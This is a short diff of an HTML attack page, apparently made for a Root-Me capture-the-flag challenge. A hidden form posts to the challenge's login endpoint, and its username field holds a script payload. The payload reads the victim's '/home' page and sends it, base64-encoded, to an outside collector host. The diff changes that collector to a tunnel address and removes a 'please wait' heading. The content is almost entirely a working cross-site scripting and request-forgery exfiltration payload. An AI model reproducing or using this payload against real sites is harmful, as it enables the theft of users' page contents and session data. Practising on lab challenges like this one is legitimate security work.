@@ -1,11 +1,10 @@
 <html>
   <body>
-    <h3>잠시만 기다려주세요...</h3>
     <form id="exploit-form" action="http://challenge01.root-me.org:58039/login" method="POST">
       <input type="hidden" name="password" value="fakepass" />
       <input type="hidden" name="_csrf" value="DUMMY_TOKEN" />
 
-      <input type="hidden" name="username" value="<script>fetch('/home').then(r => r.text()).then(html => { fetch('https://server.free.beeceptor.com/?data=' + btoa(html)); });</script>" />
+      <input type="hidden" name="username" value="<script>fetch('/home').then(r => r.text()).then(html => { fetch('https://053c478ee79209.lhr.life/?data=' + btoa(html)); });</script>" />
     </form>
     
     <script>
